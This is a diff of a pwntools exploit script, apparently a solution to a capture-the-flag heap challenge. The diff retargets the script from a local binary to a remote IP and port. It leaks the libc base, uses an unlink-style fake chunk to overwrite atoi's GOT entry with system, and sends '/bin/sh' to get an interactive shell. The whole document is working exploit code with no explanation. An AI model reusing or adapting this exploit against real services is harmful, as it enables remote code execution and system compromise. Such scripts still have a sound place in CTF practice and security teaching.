@@ -9,12 +9,12 @@ from pwnlib.util.packing import p8
 from pwn import *
 from ctypes import *
 context(os='linux', arch='amd64', log_level='debug')
-p = process("/home/zp9080/PWN/pwn")
+# p = process("/home/zp9080/PWN/pwn")
 # p=gdb.debug("/home/zp9080/PWN/pwn",'b *0x4013D2')
-# p=remote('1.95.81.93',57777)
+p=remote('125.220.147.45',49174)
 # p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
-elf = ELF("/home/zp9080/PWN/pwn")
-libc=elf.libc 
+# elf = ELF("/home/zp9080/PWN/pwn")
+libc=ELF("/home/zp9080/PWN/libc.so.6")
 
 #b *$rebase(0x14F5)
 def dbg():
@@ -53,20 +53,23 @@ show(0)
 # dbg()
 libcbase=u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))-0x1ecbe0
 print(hex(libcbase))
-pause()
+
 payload = p64(0) + p64(0x421) + p64(target - 0x18) + p64(target - 0x10)
 payload = payload.ljust(0x420,b'\x00')
 payload += p64(0x420)
 edit(0,payload)
 
 delete(1)
-edit(1,b'/bin/sh\x00')
+
+atoi_got=0x404060
 free_hook=libcbase+libc.sym['__free_hook']
 system=libcbase+libc.sym['system']
-payload=b'\x00'*0x18+p64(free_hook)
+payload=b'\x00'*0x18+p64(atoi_got)
 edit(0,payload)
 edit(0,p64(system))
-delete(1)
+
+p.sendlineafter(menu,b'/bin/sh\x00')
+# p.sendlineafter("Idx:",b'/bin/sh\x00')
 
 p.interactive()
 
